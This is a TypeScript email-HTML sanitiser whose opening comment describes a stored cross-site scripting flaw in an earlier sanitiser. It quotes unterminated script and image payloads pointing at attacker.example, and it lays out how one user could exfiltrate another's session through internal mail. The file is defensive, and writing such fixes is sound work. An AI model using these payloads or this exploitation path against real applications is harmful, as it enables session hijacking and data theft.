// src/lib/mailsec/html.ts — THE ONE PLACE THAT DECIDES WHAT EMAIL HTML IS ALLOWED TO BE.
//
// ═══ WHY THIS FILE EXISTS: THE TAG THAT WAS NEVER CLOSED ═══
//
// src/lib/mail-product/blocks.ts already had an allow-list sanitiser, and it is a good one — the
// tag list is an allow-list, `on*` handlers are dropped by construction, `javascript:` and `data:`
// hrefs are refused, and every classic bypass I threw at it (mXSS through <math>/<mglyph>, the
// <noscript> title breakout, unquoted and slash-separated attributes, entity-encoded schemes,
// nested <scr<script>ipt>) came back clean.
//
// EVERY ONE OF ITS REGEXES REQUIRES A CLOSING `>`. A tag that never closes matches none of them and
// is therefore copied to the output BYTE FOR BYTE:
//
//     input  : hello <script src="https://attacker.example/x.js"
//     output : hello <script src="https://attacker.example/x.js"
//
// That string is harmless on its own. It is not harmless where it lands. The sanitised body is
// injected into a page with `set:html`, so the browser goes on parsing INTO THE SURROUNDING PAGE:
// it is still inside the tag, and the first `>` in the application's own markup closes it. The
// script element is created, the remote script loads, and it runs on our origin with the reader's
// session.
//
// The path is short and needs no privilege at all:
//
//   1. any mailbox holder POSTs /api/mail/send with bodyHtml = `<script src="https://…"`
//   2. deliverMessage() stores it verbatim and hard-codes direction = 'internal' (mail.ts:236)
//   3. it creates a mail_box row for the recipient
//   4. the recipient opens /mail/box/inbox, whose renderBody() sends every INTERNAL message
//      through `set:html` (src/pages/mail/box/[folder].astro:127,309)
//
// So an intern can run script in the founder's session by sending them an email. There is no
// Content-Security-Policy on this deployment to blunt it. The same shape without any script at all
// exfiltrates the page: `<img src="https://attacker.example/?leak=` swallows the markup that
// follows — session-bearing URLs, tokens, message contents — into the attacker's query string.
//
// ═══ WHAT MAKES THIS ONE DIFFERENT ═══
//
// The property this file guarantees, and the previous one could not:
//
//     THE OUTPUT CONTAINS NO `<` EXCEPT THE ONES THIS FILE EMITTED ITSELF.
//
// It does not "remove dangerous things". It rebuilds the document: it walks the input, and at every
// `<` it either parses a COMPLETE, well-formed, allow-listed tag and re-emits a clean version of it,
// or it writes `&lt;` and moves on one character. There is no third branch. An unterminated tag, an
// unterminated comment, an unterminated attribute quote and a stray `<` in prose all fall into the
// same branch and all become text. That is what makes the guarantee provable by reading rather than
// by enumerating attacks — and enumerating attacks is exactly what failed above.
//
// It is deliberately NOT a general-purpose HTML sanitiser and must not be sold as one. It sanitises
// EMAIL bodies: a small, boring subset of HTML, no scripting, no forms, no embedded documents.
//
// ═══ TWO CALLERS, TWO DIFFERENT RISKS ═══
//
// Rendering someone else's HTML inside our own origin (`set:html`) and rendering it inside a
// `sandbox=""` iframe are not the same exposure, and the same defaults should not serve both. So the
// caller declares the context and the strictness follows from it — see ORIGIN and ISOLATED below.
// Nothing here silently picks the weaker one: the default IS the strict one.

/** What was taken out, so a surface can say so instead of quietly changing someone's message. */
export interface Removal {
  kind: 'element' | 'attribute' | 'url' | 'style' | 'comment' | 'malformed';
  /** The tag or attribute name, lower-cased. `#text` for a stray bracket. */
  name: string;
  /** Why, in a sentence a person can read. */
  reason: string;
}

export interface SanitizeResult {
  html: string;
  removed: Removal[];
  /** True when nothing had to be taken out. Lets a caller skip a "we changed this" notice. */
  clean: boolean;
}

export interface SanitizeOptions {
  /**
   * Allow `<img src>` and `url()` in styles to point at other people's servers.
   *
   * ON for a mail body (an email without its images is not the message that was sent). OFF is
   * available for surfaces that must not leak the reader's IP address and reading time to whoever
   * sent the mail.
   */
  allowRemoteResources?: boolean;
  /** Allow the `style` attribute at all. Off means every style is dropped, which is very plain. */
  allowStyle?: boolean;
  /**
   * Refuse styles that lift content out of its box — `position: fixed|absolute|sticky`, and
   * `z-index`. Meaningless in a mail client and dangerous in ours: a message body that can cover
   * the page can put a fake dialog over the real application.
   *
   * Must be ON whenever the result is rendered inside our own origin.
   */
  forbidLayoutEscape?: boolean;
  /** Hard cap. Beyond this the body is truncated rather than parsed. */
  maxLength?: number;
}

/**
 * Rendering INSIDE our own origin (`set:html`). Everything that could reach beyond the message box
 * is refused, because everything here shares a document with the application.
 */
export const ORIGIN: Required<SanitizeOptions> = {
  allowRemoteResources: true,
  allowStyle: true,
  forbidLayoutEscape: true,
  maxLength: 500_000,
};

/**
 * Rendering inside `<iframe sandbox="">`, which already has no script, no forms, no navigation and
 * a unique origin. Layout tricks cannot reach the application through an iframe, so the message is
 * allowed to look like itself.
 */
export const ISOLATED: Required<SanitizeOptions> = {
  allowRemoteResources: true,
  allowStyle: true,
  forbidLayoutEscape: false,
  maxLength: 1_000_000,
};

/** Composing a message we are about to SEND. Same rules as ORIGIN; the recipient is not our origin,
 *  but our domain signs it, and we do not put our name on markup we would not render ourselves. */
export const OUTBOUND: Required<SanitizeOptions> = ORIGIN;

// ─────────────────────────────────────────────────────────────────────────────────────────────────
// The allow-lists.
//
// Kept BYTE-IDENTICAL to src/lib/mail-product/blocks.ts on purpose. This file changes the PARSER,
// not the policy: a template that renders today must render the same way tomorrow, or the fix
// arrives as a visual regression across every stored message and gets reverted for the wrong
// reason. If the policy should change, change it here deliberately and separately.
// ─────────────────────────────────────────────────────────────────────────────────────────────────

const ALLOWED_TAGS = new Set([
  'p', 'br', 'strong', 'b', 'em', 'i', 'u', 's', 'a', 'span', 'div',
  'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'blockquote', 'small', 'sub', 'sup',
  'table', 'thead', 'tbody', 'tr', 'td', 'th', 'img', 'hr', 'center', 'font',
]);

const ALLOWED_ATTRS = new Set([
  'href', 'title', 'alt', 'src', 'width', 'height', 'align', 'style', 'target', 'rel',
  'colspan', 'rowspan', 'bgcolor', 'color', 'face', 'size', 'cellpadding', 'cellspacing', 'border',
]);

/** Tags whose CONTENT must go too. Left as text, a stylesheet or a script body is at best noise and
 *  at worst a second parse. Handled before the walk; an unterminated one is caught by the walk. */
const CONTENT_BEARING = [
  'script', 'style', 'title', 'textarea', 'xmp', 'noscript', 'noembed', 'noframes',
  'iframe', 'frame', 'frameset', 'object', 'embed', 'applet', 'svg', 'math', 'template', 'form',
];

const VOID_TAGS = new Set(['br', 'img', 'hr']);

/**
 * A COMPLETE tag, anchored at position 0.
 *
 * The attribute section accepts a quoted run containing anything (so `>` inside a quoted value does
 * not end the tag early) or a bare character that is not a quote or `>`. An attribute quote that is
 * never closed therefore makes this whole pattern FAIL, which is the correct answer: a tag whose
 * quoting is broken is not a tag we are willing to rebuild.
 */
const TAG_AT = /^<(\/?)([a-zA-Z][a-zA-Z0-9]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>/;

/** One attribute. Quoted, single-quoted or bare — the three forms a browser accepts. */
const ATTR_RE = /([a-zA-Z][a-zA-Z0-9:_.-]*)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]*)))?/g;

/** A complete comment, anchored. An unterminated `<!--` does not match, and becomes text. */
const COMMENT_AT = /^<!--[\s\S]*?-->/;
/** `<!doctype …>`, `<![CDATA[…]]>`, `<?xml …?>` — complete forms only, all dropped. */
const DECL_AT = /^<[!?][^>]*>/;

// ─────────────────────────────────────────────────────────────────────────────────────────────────
// URL policy
// ─────────────────────────────────────────────────────────────────────────────────────────────────

/**
 * Schemes a link may use.
 *
 * The check runs on a value with leading whitespace and C0 control characters ALREADY STRIPPED,
 * because a browser strips them before it looks at the scheme — so `\u0001javascript:` and
 * `\n java\tscript:` are the same URL to a browser and must be the same URL to us. HTML entities are
 * decoded first for the same reason: `&#106;avascript:` is `javascript:` by the time it is used.
 */
const SAFE_SCHEME = /^(https?|mailto|tel|cid):/i;
/** A bare domain an author typed without a scheme. Upgraded to https, never guessed at otherwise. */
const BARE_DOMAIN = /^[\w-]+(\.[\w-]+)+([/?#]|$)/;

/** Decode the entity forms a browser would decode before using a URL. Deliberately narrow. */
function decodeEntities(s: string): string {
  return s
    .replace(/&#x([0-9a-f]+);?/gi, (_m, h) => safeFromCode(parseInt(h, 16)))
    .replace(/&#(\d+);?/g, (_m, d) => safeFromCode(parseInt(d, 10)))
    .replace(/&(tab|newline|colon|NewLine|Tab);/gi, (_m, n) =>
      String(n).toLowerCase() === 'colon' ? ':' : '\t');
}
function safeFromCode(n: number): string {
  return Number.isFinite(n) && n >= 0 && n <= 0x10ffff ? String.fromCodePoint(n) : '';
}

/** Everything a browser ignores when it reads a URL: leading/trailing space and every C0 control. */
function urlNormalise(raw: string): string {
  return decodeEntities(String(raw ?? ''))
    // eslint-disable-next-line no-control-regex
    .replace(/[\u0000-\u001F\u007F]/g, '')
    .trim();
}

/** A link that may go in an href, or '' when it may not. */
export function safeHref(raw: unknown): string {
  const s = urlNormalise(String(raw ?? ''));
  if (!s) return '';
  if (s.startsWith('#')) return s.slice(0, 2000);
  if (SAFE_SCHEME.test(s)) return s.slice(0, 2000);
  if (BARE_DOMAIN.test(s)) return 'https://' + s.slice(0, 2000);
  return '';
}

/** An image source, or '' when it may not load. `data:` is refused: it is the SVG-in-an-image hole. */
export function safeSrc(raw: unknown, allowRemote: boolean): string {
  const s = urlNormalise(String(raw ?? ''));
  if (!s) return '';
  if (/^cid:/i.test(s)) return s.slice(0, 2000);
  if (!/^https?:\/\//i.test(s)) return '';
  if (!allowRemote && !/^https?:\/\/(www\.)?edurankai\.in\//i.test(s)) return '';
  return s.slice(0, 2000);
}

// ─────────────────────────────────────────────────────────────────────────────────────────────────
// Style policy
// ─────────────────────────────────────────────────────────────────────────────────────────────────

const STYLE_FORBIDDEN = /(javascript\s*:|expression\s*\(|behaviou?r\s*:|@import|-moz-binding|url\s*\(\s*['"]?\s*(javascript|data|vbscript))/i;
const STYLE_LAYOUT = /(position\s*:\s*(fixed|absolute|sticky)|z-index\s*:)/i;
const STYLE_REMOTE = /url\s*\(\s*['"]?\s*(https?:)?\/\//i;

/** A style attribute value, or null when the whole attribute must go. */
function safeStyle(raw: string, opts: Required<SanitizeOptions>, out: Removal[]): string | null {
  const decoded = decodeEntities(raw);
  if (STYLE_FORBIDDEN.test(decoded)) {
    out.push({ kind: 'style', name: 'style', reason: 'the style tried to run code or load a stylesheet' });
    return null;
  }
  if (opts.forbidLayoutEscape && STYLE_LAYOUT.test(decoded)) {
    out.push({ kind: 'style', name: 'style', reason: 'the style would have lifted the message out of its own box' });
    return null;
  }
  if (!opts.allowRemoteResources && STYLE_REMOTE.test(decoded)) {
    out.push({ kind: 'style', name: 'style', reason: 'the style loaded something from another server' });
    return null;
  }
  return raw.slice(0, 2000);
}

// ─────────────────────────────────────────────────────────────────────────────────────────────────

/** Escape a value going into a double-quoted attribute. Nothing may close the quote or open a tag. */
function escAttr(v: string): string {
  return String(v ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * Drop content-bearing elements together with their contents.
 *
 * ONLY the closed form is handled here, and that is not an oversight — the unterminated form is
 * precisely what the walk below is for, and trying to guess where an unterminated `<style>` "should"
 * end is how a sanitiser starts inventing markup that was never sent.
 */
function stripContentBearing(html: string, out: Removal[]): string {
  let s = html;
  for (const tag of CONTENT_BEARING) {
    const re = new RegExp('<' + tag + '\\b(?:"[^"]*"|\'[^\']*\'|[^>"\'])*>[\\s\\S]*?<\\/' + tag + '\\s*>', 'gi');
    s = s.replace(re, () => {
      out.push({ kind: 'element', name: tag, reason: 'this element and its contents are not allowed in a message body' });
      return '';
    });
  }
  return s;
}

/**
 * Sanitise an email body.
 *
 * The walk is the whole design. Read the loop and the guarantee at the top of this file is visible:
 * every `<` is either the start of a tag this function rebuilds, or it becomes `&lt;`.
 */
export function sanitizeEmailHtml(input: unknown, options: SanitizeOptions = ORIGIN): SanitizeResult {
  const opts: Required<SanitizeOptions> = { ...ORIGIN, ...options };
  const removed: Removal[] = [];

  let html = String(input ?? '');
  if (html.length > opts.maxLength) {
    html = html.slice(0, opts.maxLength);
    removed.push({ kind: 'malformed', name: '#document', reason: 'the message body was longer than we will render and was truncated' });
  }

  html = stripContentBearing(html, removed);

  let out = '';
  let i = 0;
  while (i < html.length) {
    const lt = html.indexOf('<', i);
    if (lt === -1) { out += html.slice(i); break; }
    // Text between tags is copied untouched: it cannot contain `<`, and re-escaping `&` here would
    // turn every `&amp;` a sender wrote into a visible `&amp;amp;`.
    out += html.slice(i, lt);

    const rest = html.slice(lt);

    const comment = COMMENT_AT.exec(rest);
    if (comment) {
      removed.push({ kind: 'comment', name: '#comment', reason: 'comments are removed; a conditional comment can hide a second document' });
      i = lt + comment[0].length;
      continue;
    }

    const decl = DECL_AT.exec(rest);
    if (decl) {
      removed.push({ kind: 'element', name: '#declaration', reason: 'a doctype or processing instruction has no place inside a message body' });
      i = lt + decl[0].length;
      continue;
    }

    const m = TAG_AT.exec(rest);
    if (!m) {
      // THE BRANCH THIS FILE WAS WRITTEN FOR. An unterminated tag, an unterminated comment, an
      // unterminated attribute quote, or a `<` somebody typed in prose. All of them are text.
      removed.push({ kind: 'malformed', name: '#text', reason: 'an unfinished tag was shown as text rather than left to be completed by the page around it' });
      out += '&lt;';
      i = lt + 1;
      continue;
    }

    const closing = m[1] === '/';
    const tag = m[2].toLowerCase();
    const attrs = m[3] || '';
    i = lt + m[0].length;

    if (!ALLOWED_TAGS.has(tag)) {
      removed.push({ kind: 'element', name: tag, reason: 'that element is not allowed in a message body' });
      continue;
    }
    if (closing) { out += '</' + tag + '>'; continue; }

    const kept: string[] = [];
    let sawTarget = false;
    ATTR_RE.lastIndex = 0;
    for (const a of attrs.matchAll(ATTR_RE)) {
      const name = a[1].toLowerCase();
      const rawValue = a[2] ?? a[3] ?? a[4] ?? '';
      if (!ALLOWED_ATTRS.has(name)) {
        // Every `on*` handler lands here by construction — the allow-list never names one.
        removed.push({ kind: 'attribute', name, reason: 'that attribute is not allowed on a message body element' });
        continue;
      }
      let value = rawValue;
      if (name === 'href') {
        value = safeHref(rawValue);
        if (!value) { removed.push({ kind: 'url', name: 'href', reason: 'that link did not use a scheme we allow' }); continue; }
      } else if (name === 'src') {
        value = safeSrc(rawValue, opts.allowRemoteResources);
        if (!value) { removed.push({ kind: 'url', name: 'src', reason: 'that image address was refused' }); continue; }
      } else if (name === 'style') {
        if (!opts.allowStyle) { removed.push({ kind: 'style', name: 'style', reason: 'styles are not rendered on this surface' }); continue; }
        const styled = safeStyle(rawValue, opts, removed);
        if (styled === null) continue;
        value = styled;
      }
      if (name === 'target') sawTarget = true;
      kept.push(name + '="' + escAttr(value) + '"');
    }

    // A link that opens in this tab can navigate the application away from itself; one that opens a
    // new tab without `rel` hands the opener to whoever the sender chose. Both are set, always.
    if (tag === 'a') {
      if (!sawTarget) kept.push('target="_blank"');
      kept.push('rel="noopener noreferrer nofollow"');
    }

    out += '<' + tag + (kept.length ? ' ' + kept.join(' ') : '') + (VOID_TAGS.has(tag) ? ' /' : '') + '>';
  }

  return { html: out, removed, clean: removed.length === 0 };
}

/** The string-only form, for callers that just want the body. */
export function sanitizeEmailHtmlString(input: unknown, options: SanitizeOptions = ORIGIN): string {
  return sanitizeEmailHtml(input, options).html;
}

/**
 * Plain text from HTML, for the text/plain part and for a snippet.
 *
 * Separate from the sanitiser on purpose: this one is allowed to throw everything away, and a
 * caller must never be tempted to use it as a security control. Stripping tags is not sanitising —
 * `<img src=x onerror=…` with no closing bracket survives a naive tag strip too.
 */
export function htmlToPlainText(input: unknown): string {
  let s = String(input ?? '');
  for (const tag of CONTENT_BEARING) {
    s = s.replace(new RegExp('<' + tag + '\\b[\\s\\S]*?<\\/' + tag + '\\s*>', 'gi'), ' ');
  }
  return s
    .replace(/<\s*br\s*\/?>/gi, '\n')
    // Two, not one: a paragraph break that reads as a line break turns a formatted message into a
    // wall of text in the text/plain part, which is the part a screen reader and a plain-text client
    // actually get. The `\n{3,}` collapse below keeps it from running away.
    .replace(/<\s*\/\s*(p|div|tr|li|h[1-6]|blockquote)\s*>/gi, '\n\n')
    .replace(/<[^>]*>/g, ' ')
    .replace(/&nbsp;/gi, ' ')
    .replace(/&amp;/gi, '&')
    .replace(/&lt;/gi, '<')
    .replace(/&gt;/gi, '>')
    .replace(/&quot;/gi, '"')
    .replace(/&#39;/g, "'")
    .replace(/[ \t]+/g, ' ')
    // A block end became '\n' and the block that follows became ' ', so without this every
    // paragraph after the first arrives indented by one space.
    .replace(/[ \t]*\n[ \t]*/g, '\n')
    .replace(/\n{3,}/g, '\n\n')
    .trim();
}
